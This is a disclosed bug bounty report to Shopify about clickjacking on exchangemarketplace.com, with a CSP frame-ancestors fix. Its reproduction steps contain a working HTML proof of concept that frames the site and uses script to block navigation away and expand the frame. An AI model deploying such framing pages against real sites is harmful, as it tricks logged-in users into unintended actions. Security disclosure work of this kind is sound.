# Clickjacking in [exchangemarketplace.com]

## Report Details
- **Report ID**: 658217
- **URL**: https://hackerone.com/reports/658217
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-24T14:44:09.704Z
- **Disclosed**: 2019-09-18T20:24:27.441Z

## Reporter
- **Username**: eissen5c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi Team,

#Summary:
X-Frame-Options ALLOW-FROM https://exchangemarketplace.com not supported by several Browser, this caused Clickjacking on https://exchangemarketplace.com

#Type of issue : 
Clickjacking

#Description:
Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on.

#Sensitive Action :
If user already logged in it will more sensitive to victim
Inbox
Logout
Searching Store
Browsing the Store
Sell your business related
Almost Everything can vulnerable to clickjacking on the site

#Steps To Reproduce:
Save Code as HTML file contains following code:
```
Vulnerable to Clickjacking
<script  >function t(e){window.setTimeout("stop();",10);}window.onbeforeunload=t;var frames=new Array();</script>
<div  qjid="quickjack" style="overflow: hidden; width: 1330px; height: 539px; position: relative;" id="cksl6">
<iframe   name="cksl7" src="https://exchangemarketplace.com" style="border: 0pt none ; left: -6px; top: -3px; position: absolute; width: 1366px; height: 576px;" scrolling="no" onload="window.cksl3='';window.cksl1=function(arg){if(!window.cksl2)window.cksl2=arg;if(window.cksl2<arg){if(window.cksl3){self.location.href=window.cksl3;}else {var c4=document.getElementById('cksl6').style;var c5=document.getElementsByName('cksl7')[0].style;document.body.style.overflow='hidden';document.body.style.width=document.body.style.height=c4.width=c5.width=c4.height=c5.height='100%';c4.position=c5.position='absolute';c4.overflow=c5.overflow='visible';c4.top=c5.top=c4.left=c5.left='0px';}window.cksl2=arg;}setTimeout('window.cksl1(history.length)',1000);};setTimeout('window.cksl1(history.length)',2000);"></iframe></div>
```

#Solution:
Based on Report : #591432
The vulnerability can be fixed by adding "frame-ancestors 'self';" to the CSP (Content-Security-Policy) header.

#Reference (Related Case in this Report)
https://hackerone.com/reports/591432
https://www.owasp.org/index.php/Clickjacking

#Proof of Concept
{F538039}

## Impact

Attacker may tricked user, sending them malicious link then user open it clicked some , Sensitive actions such as the more user already logged in it will more sensitive , inbox , logout , searching store , browsing the store , sell your business related and Almost Everything can vulnerable to clickjacking on the site.

Regards
eissen5c

## Attachments
- clickjacking.JPG
